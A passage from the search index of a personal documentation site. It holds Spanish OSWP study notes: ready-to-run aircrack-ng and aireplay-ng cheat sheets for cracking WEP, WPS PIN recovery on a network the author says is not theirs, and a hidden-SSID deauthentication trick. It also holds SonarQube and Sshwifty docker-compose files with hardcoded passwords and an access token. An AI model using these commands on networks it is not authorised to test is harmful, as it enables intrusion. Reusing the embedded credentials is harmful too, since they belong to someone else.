sistema operativo orientado al Hacking y Auditor\u00eda WiFi. Cuenta con bastantes herramientas de automatizaci\u00f3n como Fluxion, Linset o Wifimosys que automatizan todo lo que nosotros hemos estado haciendo a mano. Es un OS principalmente orientados a Script Kiddies.</p> <p>Una de las herramientas de Wifislax que uso con bastante frecuencia es WPSPinGenerator, por no decir que es la \u00fanica herramienta que utilizo de este OS. \u00bfQu\u00e9 nos permite hacer WPSPinGenerator?, ve\u00e1moslo con un ejemplo pr\u00e1ctico.</p> <p>Al principio, es necesario seleccionar la interfaz de red con la que trabajar, especificar los canales sobre los cual queremos escanear, en fin... lo t\u00edpico. Esta parte me la saltar\u00e9.</p> <p>Una vez escaneamos las redes disponibles de nuestro entorno, vemos algo como esto:</p> <p></p> <p>Si nos fijamos, vemos que para cada red inal\u00e1mbrica, se nos dice si esta cuenta o no con un PIN gen\u00e9rico. (Recomiendo que leas c\u00f3mo funciona la asociaci\u00f3n a trav\u00e9s de PIN).</p> <p>Una vez seleccionamos la red, fijaros que interesante:</p> <p></p> <p>Nos lista los posibles PINES para esa red. Generalmente, a los 3 intentos, el router bloquea el WPS para que no se puedan enviar m\u00e1s solicitudes. Sin embargo, a veces en vez de ser 5 pines, la herramienta nos reporta 2, o incluso 1.</p> <p>Para este caso, que son 5, el PIN correcto estaba en la primera posici\u00f3n (no es mi red), y tras seleccionar la opci\u00f3n 2, obtenemos los siguientes resultados:</p> <p></p> <p>La contrase\u00f1a de la red inal\u00e1mbrica en texto claro directamente. Por si no la ves bien:</p> <p></p> <p>\u00bfLo bueno de esto?, que no importa cuantas veces cambies la contrase\u00f1a... pues si el PIN sigue siendo el mismo para la eternidad, como atacantes siempre vamos a ser capaces de verla en cuesti\u00f3n de segundos, independientemente de su longitud o robustez.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#redes-wpa-ocultas","title":"Redes WPA Ocultas","text":"<p>Ya para acabar este Gist, os cito una t\u00e9cnica para redes WPA que est\u00e1n configuradas como ocultas.</p> <p>Generalmente, desde aircrack, se listan las redes ocultas de esta forma:</p> <p><code>&lt;length: 0&gt;</code></p> <p>\u00bfQu\u00e9 hacemos en este caso cuando la red est\u00e1 oculta?, bueno, sabemos que a nivel de filtrado no vamos a tener problema... pues filtramos por la BSSID y problema resuelto. Sin embargo, hay un peque\u00f1o fallo de esta configuraci\u00f3n que nos permite dar con la ESSID del AP.</p> <p>Si efecutamos un ataque de de-autenticaci\u00f3n global para expulsar a todos los clientes (o dirigido en caso de que haya s\u00f3lo uno), cuando estos tratan de re-asociarse al AP, uno de los paquetes que mandan ya hemos visto que son los Probe Request:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==4\" 2&gt;/dev/null\n   59 3.094674701 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=1378, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n   63 3.304134536 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=1379, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n   98 4.671950803 Apple_48:66:14 \u2192 Broadcast    802.11 213 Probe Request, SN=1113, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  100 4.682076898 Apple_48:66:14 \u2192 Broadcast    802.11 213 Probe Request, SN=1114, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n</code></pre> <p>Perfecto, pues de estos paquetes, siempre el primero emitido antes de empezar con la fase de asociaci\u00f3n emite por defecto el ESSID de la red en texto claro, de manera no oculta y transparente para el atacante.</p> <p>De esta forma, podemos ser capaces de extraer el ESSID de la red tras aplicar un ataque de de-autenticaci\u00f3n sobre una de las estaciones presentes. \u00bfPero qu\u00e9 es lo bueno de esto?, que ni nosotros tenemos que hacer el trabajo. Una vez la propia suite de aircrack detecta estos paquetes Probe, los parsea en busca del ESSID de la red oculta. En caso de obtenerla, sustituye el campo <code>&lt;length: 0&gt;</code> por el ESSID descubierto, autom\u00e1ticamente.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#redes-wep","title":"Redes WEP","text":"<p>IMPORTANTE: En este punto, no entrar\u00e9 tanto al detalle como en las redes de protocolo WPA. \u00bfPor qu\u00e9?, porque ya para eso tienes todo el material necesario que te entregan tras cursar la certificaci\u00f3n, que se orienta a vulnerar el protocolo WEP. Todo lo visto hasta ahora, han sido t\u00e9cnicas que os quer\u00eda compartir sobre el protocolo WPA/WPA2, ya que es el m\u00e1s usado a d\u00eda de hoy y el que con m\u00e1s frecuencia nos vamos a encontrar en nuestro entorno.</p> <p>A\u00fan as\u00ed, dejo un Cheat Sheet para cada uno de los casos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#fake-authentication-attack","title":"Fake Authentication Attack","text":"<pre><code>s4vitar@parrot:~# airmon-ng start wlan0\ns4vitar@parrot:~# airodump-ng \u2013c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon\n# Identificamos nuestra MAC\ns4vitar@parrot:~# macchanger --show wlan0mon\ns4vitar@parrot:~# aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -e &lt;ESSID&gt; wlan0mon\ns4vitar@parrot:~# aireplay-ng -2 \u2013p 0841 \u2013c FF:FF:FF:FF:FF:FF \u2013b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon\ns4vitar@parrot:~# aircrack-ng \u2013b &lt;BSSID&gt; &lt;archivoPCAP&gt;\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#arp-replay-attack","title":"ARP Replay Attack","text":"<pre><code>s4vitar@parrot:~# airmon-ng start wlan0\ns4vitar@parrot:~# airodump-ng \u2013c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon\n# Identificamos nuestra MAC\ns4vitar@parrot:~# macchanger --show wlan0mon\ns4vitar@parrot:~# aireplay-ng -3 \u2013x 1000 \u2013n 1000 \u2013b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon\ns4vitar@parrot:~# aircrack-ng \u2013b &lt;BSSID&gt; &lt;archivoPCAP&gt;\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#chop-chop-attack","title":"Chop Chop Attack","text":"<pre><code>s4vitar@parrot:~# airmon-ng start wlan0\ns4vitar@parrot:~# airodump-ng \u2013c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon\n# Identificamos nuestra MAC\ns4vitar@parrot:~# macchanger --show wlan0mon\ns4vitar@parrot:~# aireplay-ng -1 0 \u2013e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon\ns4vitar@parrot:~# aireplay-ng -4 \u2013b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon\n # Presionamos \u2018y\u2019 ;\ns4vitar@parrot:~# packetforge-ng -0 \u2013a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;\ns4vitar@parrot:~# aireplay-ng -2 \u2013r &lt;FileName2&gt; wlan0mon\ns4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#fragmentation-attack","title":"Fragmentation Attack","text":"<pre><code>s4vitar@parrot:~# airmon-ng start wlan0\ns4vitar@parrot:~# airodump-ng \u2013c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon\n# Identificamos nuestra MAC\ns4vitar@parrot:~# macchanger --show wlan0mon\ns4vitar@parrot:~# aireplay-ng -1 0 \u2013e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon\ns4vitar@parrot:~# aireplay-ng -5 \u2013b&lt;BSSID&gt; -h &lt;nuestraMAC &gt; wlan0mon\n# Presionamos \u2018y\u2019 ;\ns4vitar@parrot:~# packetforge-ng -0 \u2013a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;\ns4vitar@parrot:~# aireplay-ng -2 \u2013r &lt;FileName2&gt; wlan0mon\ns4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ska-type-cracking","title":"SKA Type Cracking","text":"<pre><code>s4vitar@parrot:~# airmon-ng start wlan0\ns4vitar@parrot:~# airodump-ng \u2013c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon\ns4vitar@parrot:~# aireplay-ng -0 10 \u2013a &lt;BSSID&gt; -c &lt;macVictima&gt; wlan0mon\ns4vitar@parrot:~# ifconfig wlan0mon down\ns4vitar@parrot:~# macchanger \u2013-mac &lt;macVictima&gt; wlan0mon\ns4vitar@parrot:~# ifconfig wlan0mon up\ns4vitar@parrot:~# aireplay-ng -3 \u2013b &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon\ns4vitar@parrot:~# aireplay-ng \u2013-deauth 1 \u2013a &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon\ns4vitar@parrot:~# aircrack-ng &lt;archivoPCAP&gt;\n</code></pre>"},{"location":"Seguridad/Pentesting/Formaciones/","title":"Formaciones","text":"<p>https://thehackerway.es/producto/zap-proxy-pack/</p>"},{"location":"Seguridad/Pentesting/GitHub%20PenTools/","title":"GitHub PenTools","text":"<p>https://github.com/TROUBLE-1</p>"},{"location":"Sonarqube/docker/","title":"Docker","text":"<pre><code>version: '3'\n\nservices:\n\n  sonarqube:\n    container_name: sonarqube\n    image: docker.io/bitnami/sonarqube:9\n    ports:\n      - 9000:9000\n    volumes:\n      - ./sonar/sonarqube_data:/bitnami/sonarqube\n    depends_on:\n      - db_sonar\n    environment:\n      # ALLOW_EMPTY_PASSWORD is recommended only for development.\n      - ALLOW_EMPTY_PASSWORD=no\n      - SONARQUBE_USERNAME=admin\n      - SONARQUBE_PASSWORD=BTS2022\n      - SONARQUBE_DATABASE_HOST=db_sonar\n      - SONARQUBE_DATABASE_PORT_NUMBER=5432\n      - SONARQUBE_DATABASE_USER=bn_sonarqube\n      - SONARQUBE_DATABASE_PASSWORD=bn_sonarqube\n      - SONARQUBE_DATABASE_NAME=bitnami_sonarqube\n    networks:\n      - denuncias\n  db_sonar:\n    container_name: sonar_db\n    image: docker.io/bitnami/postgresql:13\n    volumes:\n      - ./sonar/postgresql_data:/bitnami/postgresql\n    environment:\n      # ALLOW_EMPTY_PASSWORD is recommended only for development.\n      - ALLOW_EMPTY_PASSWORD=no\n      - POSTGRESQL_USERNAME=bn_sonarqube\n      - POSTGRESQL_PASSWORD=bn_sonarqube\n      - POSTGRESQL_DATABASE=bitnami_sonarqube\n    networks:\n      - denuncias\n\n# docker run --rm -e SONAR_HOST_URL= -e SONAR_LOGIN=${TOKEN} -v \"${YOUR_REPO}:/usr/src\"  sonarsource/sonar-scanner-cli \n# image: sonarsource/sonar-scanner-cli\n  front:\n    container_name: frontsq\n    image: sonarsource/sonar-scanner-cli\n    environment:\n      - SONAR_HOST_URL=http://sonarqube:9000\n      - SONAR_LOGIN=ca263994f75c64b6be0aac780a1ce7e247a16043\n    volumes:\n      - ./front:/usr/src\n    networks:\n      - denuncias\n    depends_on:\n      - sonarqube\n\nnetworks:\n  denuncias:\n</code></pre> <pre><code>sysctl -w vm.max_map_count=524288\nsysctl -w fs.file-max=131072\nulimit -n 131072\nulimit -u 8192\n</code></pre>"},{"location":"Sonarqube/gitlabIntegration/","title":"GitLab Integration","text":"<p>SonarQube's integration with GitLab Self-Managed and GitLab.com allows you to maintain code quality and security in your GitLab projects.</p> <p>With this integration, you'll be able to:</p> <ul> <li>Authenticate with GitLab - Sign in to SonarQube with your GitLab credentials.</li> <li>Import your GitLab projects - Import your GitLab Projects into SonarQube to easily set up SonarQube projects.</li> <li>Analyze projects with GitLab CI/CD - Integrate analysis into your build pipeline. Starting in Developer Edition, SonarScanners running in GitLab CI/CD jobs can automatically detect branches or merge requests being built so you don't need to specifically pass them as parameters to the scanner.</li> <li>Report your Quality Gate status to your merge requests - (starting in Developer Edition) See your Quality Gate and code metric results right in GitLab so you know if it's safe to merge your changes.</li> </ul>"},{"location":"Sonarqube/gitlabIntegration/#prerequisites","title":"Prerequisites","text":"<p>Integration with GitLab Self-Managed requires at least GitLab Self-Managed version 11.7.</p>"},{"location":"Sonarqube/gitlabIntegration/#branch-analysis","title":"Branch Analysis","text":"<p>Community Edition doesn't support the analysis of multiple branches, so you can only analyze your main branch. Starting in Developer Edition, you can analyze multiple branches and merge requests.</p>"},{"location":"Sonarqube/gitlabIntegration/#authenticating-with-gitlab","title":"Authenticating with GitLab","text":"<p>You can delegate authentication to GitLab using a dedicated GitLab OAuth application.</p>"},{"location":"Sonarqube/gitlabIntegration/#creating-a-gitlab-oauth-app","title":"Creating a GitLab OAuth app","text":"<p>You can find general instructions for creating a GitLab OAuth app here.</p> <p>Specify the following settings in your OAuth app:</p> <ul> <li>Name \u2013 your app's name, such as SonarQube.</li> <li>Redirect URI \u2013 enter your SonarQube URL with the path <code>/oauth2/callback/gitlab</code>. For example, <code>https://sonarqube.mycompany.com/oauth2/callback/gitlab</code>.</li> <li>Scopes \u2013 select api if you plan to enable group synchronization. Select read_user if you only plan to delegate authentication.</li> </ul> <p>After saving your application, GitLab takes you to the app's page. Here you find your Application ID and Secret. Keep these handy, open your SonarQube instance, and navigate to Administration &gt; Configuration &gt; General Settings &gt; DevOps Platform Integrations &gt; GitLab &gt; Authentication. Set the following settings to finish setting up GitLab authentication:</p> <ul> <li>Enabled \u2013 set to <code>true</code>.</li> <li>Application ID \u2013 the Application ID is found on your GitLab app's page.</li> <li>Secret \u2013 the Secret is found on your GitLab app's page.</li> </ul> <p>On the login form, the new \"Log in with GitLab\" button allows users to connect with their GitLab accounts.</p>"},{"location":"Sonarqube/gitlabIntegration/#gitlab-group-synchronization","title":"GitLab group synchronization","text":"<p>Enable Synchronize user groups at Administration &gt; Configuration &gt; General Settings &gt; DevOps Platform Integrations &gt; GitLab to associate GitLab groups with existing SonarQube groups of the same name. GitLab users inherit membership to subgroups from parent groups.</p> <p>To synchronize a GitLab group or subgroup with a SonarQube group, name the SonarQube group with the full path of the GitLab group or subgroup URL.</p> <p>For example, with the following GitLab group setup:</p> <ul> <li>GitLab group = My Group</li> <li>GitLab subgroup = My Subgroup</li> <li>GitLab subgroup URL = <code>https://YourGitLabURL.com/my-group/my-subgroup</code></li> </ul> <p>You should name your SonarQube group <code>my-group</code> to synchronize it with your GitLab group and <code>my-group/my-subgroup</code> to synchronize it with your GitLab subgroup.</p>"},{"location":"Sonarqube/gitlabIntegration/#importing-your-gitlab-projects-into-sonarqube","title":"Importing your GitLab projects into SonarQube","text":"<p>Setting up the import of GitLab projects into SonarQube allows you to easily create SonarQube projects from your GitLab projects. If you're using Developer Edition or above, this is also the first step in adding merge request decoration.</p> <p>To set up the import of GitLab projects:</p> <ol> <li>Set your global settings</li> <li>Add a personal access token for importing repositories</li> </ol>"},{"location":"Sonarqube/gitlabIntegration/#setting-your-global-settings","title":"Setting your global settings","text":"<p>To import your GitLab projects into SonarQube, you need to first set your global SonarQube settings. Navigate to Administration &gt; Configuration &gt; General Settings &gt; DevOps Platform Integrations, select the GitLab tab, and specify the following settings:</p> <ul> <li> <p>Configuration Name (Enterprise and Data Center Edition only) \u2013 The name used to identify your GitLab configuration at the project level. Use something succinct and easily recognizable.</p> </li> <li> <p>GitLab URL \u2013 The GitLab API URL.</p> </li> <li> <p>Personal Access Token \u2013 A GitLab user account is used to decorate Merge Requests. We recommend using a dedicated GitLab account with at least Reporter permissions (the account needs permission to leave comments). Use a personal access token from this account with the api scope authorized for the repositories you're analyzing. Administrators can encrypt this token at Administration &gt; Configuration &gt; Encryption. See the Settings Encryption section of the Security page for more information.</p> </li> </ul> <p>This personal access token is used to report your Quality Gate status to your pull requests. You'll be asked for another personal access token for importing projects in the following section.</p>"},{"location":"Sonarqube/gitlabIntegration/#adding-a-personal-access-token-for-importing-projects","title":"Adding a personal access token for importing projects","text":"<p>After setting these global settings, you can add a project from GitLab by clicking the Add project button in the upper-right corner of the Projects homepage and selecting GitLab.</p> <p>Then, you'll be asked to provide a personal access token with <code>read_api</code> scope so SonarQube can access and list your GitLab projects. This token will be stored in SonarQube and can be revoked at anytime in GitLab.</p> <p>After saving your Personal Access Token, you'll see a list of your GitLab projects that you can set up to add them to SonarQube. Setting up your projects this way also sets your project settings for merge request decoration.</p> <p>For information on analyzing your projects with GitLab CI/CD, see the following section.</p>"},{"location":"Sonarqube/gitlabIntegration/#analyzing-projects-with-gitlab-cicd","title":"Analyzing projects with GitLab CI/CD","text":"<p>SonarScanners running in GitLab CI/CD jobs can automatically detect branches or merge requests being built so you don't need to specifically pass them as parameters to the scanner.</p> <p>To analyze your projects with GitLab CI/CD, you need to:</p> <ul> <li>Set your environment variables.</li> <li>Configure your gilab-ci.yml file.</li> </ul> <p>The following sections detail these steps.</p> <p>You need to disable git shallow clone to make sure the scanner has access to all of your history when running analysis with GitLab CI/CD. For more information, see Git shallow clone.</p>"},{"location":"Sonarqube/gitlabIntegration/#setting-environment-variables","title":"Setting environment variables","text":"<p>You can set environment variables securely for all pipelines in GitLab's settings. See GitLab's documentation on Creating a Custom Environment Variable for more information.</p> <p>You need to set the following environment variables in GitLab for analysis:</p> <ul> <li><code>SONAR_TOKEN</code> \u2013 Generate a SonarQube token for GitLab and create a custom environment variable in GitLab with <code>SONAR_TOKEN</code> as the Key and the token you generated as the Value.</li> <li><code>SONAR_HOST_URL</code> \u2013 Create a custom environment variable with <code>SONAR_HOST_URL</code> as the Key and your SonarQube server URL as the Value.</li> </ul>"},{"location":"Sonarqube/gitlabIntegration/#configuring-your-gitlab-ciyml-file","title":"Configuring your gitlab-ci.yml file","text":"<p>This section shows you how to configure your GitLab CI/CD <code>gitlab-ci.yml</code> file. The <code>allow_failure</code> parameter in the examples allows a job to fail without impacting the rest of the CI suite.</p> <p>You'll set up your build according to your SonarQube edition:</p> <ul> <li>Community Edition \u2013 Community Edition doesn't support multiple branches, so you should only analyze your main branch. You can restrict analysis to your main branch by adding the branch name to the <code>only</code> parameter in your .yml file.</li> <li>Developer Edition and above By default, GitLab will build all branches but not Merge Requests. To build Merge Requests, you need to update the <code>.gitlab-ci.yml</code> file by adding <code>merge_requests</code> to the <code>only</code> parameter in your .yml. See the example configurations below for more information.</li> </ul> <p>Click the scanner you're using below to expand an example configuration:</p> <p>SonarScanner for Gradle</p> <p>SonarScanner for Maven</p> <p>SonarScanner CLI</p>"},{"location":"Sonarqube/gitlabIntegration/#failing-the-pipeline-job-when-the-quality-gate-fails","title":"Failing the pipeline job when the Quality Gate fails","text":"<p>In order for the Quality Gate to fail on the GitLab side when it fails on the SonarQube side, the scanner needs to wait for the SonarQube Quality Gate status. To enable this, set the <code>sonar.qualitygate.wait=true</code> parameter in the <code>.gitlab-ci.yml</code> file.</p> <p>You can set the <code>sonar.qualitygate.timeout</code> property to an amount of time (in seconds) that the scanner should wait for a report to be processed. The default is 300 seconds.</p>"},{"location":"Sonarqube/gitlabIntegration/#for-more-information","title":"For more information","text":"<p>For more information on configuring your build with GitLab CI/CD, see the GitLab CI/CD Pipeline Configuration Reference.</p>"},{"location":"Sonarqube/gitlabIntegration/#reporting-your-quality-gate-status-in-gitlab","title":"Reporting your Quality Gate status in GitLab","text":"<p>After you've set up SonarQube to import your GitLab projects as shown in the previous section, SonarQube can report your Quality Gate status and analysis metrics directly to GitLab.</p> <p>To do this, add a project from GitLab by clicking the Add project button in the upper-right corner of the Projects homepage and select GitLab from the drop-down menu.</p> <p>Then, follow the steps in SonarQube to analyze your project. SonarQube automatically sets the project settings required to show your Quality Gate in your merge requests.</p> <p>To report your Quality Gate status in your merge requests, a SonarQube analysis needs to be run on your code. You can find the additional parameters required for merge request analysis on the Pull Request Analysis page.</p> <p>If you're creating your projects manually or adding Quality Gate reporting to an existing project, see the following section.</p>"},{"location":"Sonarqube/gitlabIntegration/#reporting-your-quality-gate-status-in-manually-created-or-existing-projects","title":"Reporting your Quality Gate status in manually created or existing projects","text":"<p>SonarQube can also report your Quality Gate status to GitLab merge requests for existing and manually-created projects. After you've updated your global settings as shown in the Importing your GitLab projects into SonarQube section above, set the following project settings at Project Settings &gt; General Settings &gt; DevOps Platform Integration:</p> <ul> <li>Configuration name \u2013 The configuration name that corresponds to your GitLab instance.</li> <li>Project ID \u2013 your GitLab Project ID found in GitLab</li> </ul>"},{"location":"Sshwifty/sshwifty/","title":"Sshwifty","text":""},{"location":"Sshwifty/sshwifty/#docker-compose","title":"Docker Compose","text":"<pre><code>version: \"2\"\nservices:\n  ssh:\n    image: niruix/sshwifty\n    container_name: sshwifty\n    volumes:\n      - postgres:/config\n    networks:\n      - public\n      - proxy\n    environment:\n\n      - SSHWIFTY_SOCKS5_USER=Rafa\n      - SSHWIFTY_SOCKS5_PASSWORD=\"12345\"\n      - SSHWIFTY_SHAREDKEY=Madolell1..\n    expose:\n      - 8182\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.gua.entrypoints=websecure\"\n      - \"traefik.http.routers.gua.rule=Host(`cv.madolell.tk`)\"\nnetworks:\n    public:\n    proxy:\n      external: true\nvolumes:\n  postgres:\n    driver: local\n</code></pre>"},{"location":"Sshwifty/sshwifty/","title":"Sshwifty Web SSH &amp; Telnet Client","text":"<p>Sshwifty is a SSH and Telnet connector made for the Web. It can be deployed on your computer or server to provide SSH and Telnet access interface for any compatible (standard) web browser.</p> <p></p> <p></p>"},{"location":"Sshwifty/sshwifty/#install","title":"Install","text":""},{"location":"Sshwifty/sshwifty/#binary","title":"Binary","text":"<p>Compiled binaries can be found at the release section of the page.</p> <p>Please be advised that those binaries are generated by an automatic proccess, the author of this project will NOT verify that they work. You will have to try it at your own risk.</p>"},{"location":"Sshwifty/sshwifty/#docker-image","title":"Docker Image","text":"<p>If Docker is installed on your machine, you may use our prebuilt Docker Image by executing following command:</p> <pre><code>$ docker run --detach \\\n  --restart always \\\n  --publish 8182:8182 \\\n  --name sshwifty \\\n  niruix/sshwifty:latest\n</code></pre> <p>When TLS is desired and you don't want to setup Docker Volumes, you can use <code>SSHWIFTY_DOCKER_TLSCERT</code> and <code>SSHWIFTY_DOCKER_TLSCERTKEY</code> environment variables to import credential files to the container and automatically apply them:</p> <pre><code>$ openssl req \\\n  -newkey rsa:4096 -nodes -keyout domain.key -x509 -days 90 -out domain.crt\n$ docker run --detach \\\n  --restart always \\\n  --publish 8182:8182 \\\n  --env SSHWIFTY_DOCKER_TLSCERT=\"$(cat domain.crt)\" \\\n  --env SSHWIFTY_DOCKER_TLSCERTKEY=\"$(cat domain.key)\" \\\n  --name sshwifty \\\n  niruix/sshwifty:latest\n</code></pre> <p>The <code>domain.crt</code> and <code>domain.key</code> must be a valid TLS certificate and key file located on the same machine which the <code>docker run</code> command will be executed upon.</p>"},{"location":"Sshwifty/sshwifty/#compile-from-source-code-recommanded-if-youre-a-developer","title":"Compile from source code (Recommanded if you're a developer)","text":"<p>The following tools are required in order to build the software from source code:</p> <ul> <li><code>git</code> to download the source code</li> <li><code>node</code> and <code>npm</code> to build front-end application</li> <li><code>go</code> to build back-end application</li> </ul> <p>To start the build process, execute:</p> <pre><code>$ git clone https://github.com/nirui/sshwifty\n$ cd sshwifty\n$ npm install\n$ npm run build\n</code></pre> <p>When done, you can found the newly generated <code>sshwifty</code> binary inside the current working directory.</p> <p>Notice: <code>Dockerfile</code> contains the entire build procedure of this software. Please refer to it when you encounter any compile/build related issue.</p>"},{"location":"Sshwifty/sshwifty/#deploy-on-the-cloud","title":"Deploy on the cloud","text":"<p>To deploy this project onto the cloud, Google App Engine or Heroku for example, you need to first download the source code, then generate it locally before deploying it.</p> <p><code>npm run generate</code> command will generate all static files and automatically call <code>go generate ./...</code> to bind those static files directly into program source code. And you need those generated source code to get the software to function.</p> <p>Trying to deploy ungenerated code directly to cloud will lead to failure, as required source code is missing.</p> <p>Also keep in mind, if the cloud deployment process is <code>git</code> based, you may have to modify <code>.gitignore</code> file in order to allow all required files to be uploaded.</p>"},{"location":"Sshwifty/sshwifty/#configure","title":"Configure","text":"<p>Sshwifty can be configured through either file or environment variables. By default, the configuration loader will try to load file from default paths first, when failed, environment variables will be used.</p> <p>You can also specify your own configuration file by setting up <code>SSHWIFTY_CONFIG</code> environment variable before start the software. For example:</p> <pre><code>$ SSHWIFTY_CONFIG=./sshwifty.conf.json ./sshwifty\n</code></pre> <p>This way, Sshwifty will try to load the configuration from file <code>./sshwifty.conf.json</code>, and never reach for other environment variables.</p>"},{"location":"Sshwifty/sshwifty/#configuration-file","title":"Configuration file","text":"<p>Here is all the options of a configuration file:</p> <pre><code>{\n  // HTTP Host. Keep it empty to accept request from all hosts, otherwise, only\n  // specified host is allowed to access\n  \"HostName\": \"localhost\",\n\n  // Web interface access password. Set to empty to allow public access to the\n  // web interface (By pass the Authenticate page)\n  \"SharedKey\": \"WEB_ACCESS_PASSWORD\",\n\n  // Remote dial timeout. This limits how long of time the backend can spend\n  // to connect to a remote host. The max timeout will be determined by\n  // server configuration (ReadTimeout).\n  // (In Seconds)\n  \"DialTimeout\": 10,\n\n  // Socks5 proxy. When set, Sshwifty backend will try to connect remote through\n  // the given proxy\n  \"Socks5\": \"localhost:1080\",\n\n  // Username of the Socks5 server. Please set when needed\n  \"Socks5User\": \"\",\n\n  // Password of the Socks5 server. Please set when needed\n  \"Socks5Password\": \"\",\n\n  // Sshwifty HTTP server, you can set multiple ones to serve on different\n  // ports\n  \"Servers\": [\n    {\n      // Which local network interface this server will be listening\n      \"ListenInterface\": \"0.0.0.0\",\n\n      // Which local network port this server will be listening\n      \"ListenPort\": 8182,\n\n      // Timeout of initial request. HTTP handshake must be finished within\n      // this time\n      // (In Seconds)\n      \"InitialTimeout\": 3,\n\n      // How long do the connection can stay in idle before the backend server\n      // disconnects the client\n      // (In Seconds)\n      \"ReadTimeout\": 60,\n\n      // How long the server will wait until the client connection is ready to\n      // recieve new data. If this timeout is exceed, the connection will be\n      // closed.\n      // (In Seconds)\n      \"WriteTimeout\": 60,\n\n      // The interval between internal echo requests\n      // (In Seconds)\n      \"HeartbeatTimeout\": 20,\n\n      // Forced delay between each request\n      // (In Milliseconds)\n      \"ReadDelay\": 10,\n\n      // Forced delay between each write\n      // (In Milliseconds)\n      \"WriteDelay\": 10,\n\n      // Path to TLS certificate file. Set empty to use HTTP\n      \"TLSCertificateFile\": \"\",\n\n      // Path to TLS certificate key file. Set empty to use HTTP\n      \"TLSCertificateKeyFile\": \"\"\n    },\n    {\n      \"ListenInterface\": \"0.0.0.0\",\n      \"ListenPort\": 8182,\n      \"InitialTimeout\": 3,\n      .....\n    }\n  ],\n\n  // Remote Presets, the operater can define few presets for user so the user\n  // won't have to manually fill-in all the form fields\n  //\n  // Presets will be displayed in the \"Known remotes\" tab on the Connector\n  // window\n  //\n  // Notice: You can use the same JSON value for `SSHWIFTY_PRESETS` if you are\n  //         configuring your Sshwifty through enviroment variables.\n  //\n  // Warning: Presets Data will be sent to user client WITHOUT any protection.\n  //          DO NOT add any secret information into Preset.\n  //\n  \"Presets\": [\n    {\n      // Title of the preset\n      \"Title\": \"SDF.org Unix Shell\",\n\n      // Preset Types, i.e. Telnet, and SSH\n      \"Type\": \"SSH\",\n\n      // Target address and port\n      \"Host\": \"sdf.org:22\",\n\n      // Form fields and values, you have to manually validate the correctness\n      // of the field value\n      //\n      // Defining a Meta field will prevent user from changing it on their\n      // Connector Wizard. If you want to allow users to use their own settings,\n      // leave the field unsetted\n      //\n      // Values in Meta are scheme enabled, and supports following scheme\n      // prefixes:\n      // - \"literal://\": Text literal (Default)\n      //                 Example: literal://Data value\n      //                          (The final value will be \"Data value\")\n      //                 Example: literal://file:///tmp/afile\n      //                          (The final value will be \"file:///tmp/afile\")\n      // - \"file://\": Load Meta value from given file.\n      //              Example: file:///home/user/.ssh/private_key\n      //                       (The file path is /home/user/.ssh/private_key)\n      // - \"environment://\": Load Meta value from an Environment Variable.\n      //                    Example: environment://PRIVATE_KEY_DATA\n      //                    (The name of the target environment variable is\n      //                    PRIVATE_KEY_DATA)\n      //\n      // All data in Meta is loaded during start up, and will not be updated\n      // even the source already been modified.\n      //\n      \"Meta\": {\n        // Data for predefined User field\n        \"User\": \"pre-defined-username\",\n\n        // Data for predefined Encoding field. Valid data is those displayed on\n        // the page\n        \"Encoding\": \"pre-defined-encoding\",\n\n        // Data for predefined Password field\n        \"Password\": \"pre-defined-password\",\n\n        // Data for predefined Private Key field, should contains the content\n        // of a Key file\n        \"Private Key\": \"file:///home/user/.ssh/private_key\",\n\n        // Data for predefined Authentication field. Valid values is what\n        // displayed on the page (Password, Private Key, None)\n        \"Authentication\": \"Password\",\n\n        // Data for server public key fingerprint. You can acquire the value of\n        // the fingerprint by manually connect to a new SSH host with Sshwifty,\n        // the fingerprint will be displayed on the Fingerprint comformation\n        // page.\n        \"Fingerprint\": \"SHA256:bgO....\"\n      }\n    },\n    {\n      \"Title\": \"Endpoint Telnet\",\n      \"Type\": \"Telnet\",\n      \"Host\": \"endpoint.vaguly.com:23\",\n      \"Meta\": {\n        // Data for predefined 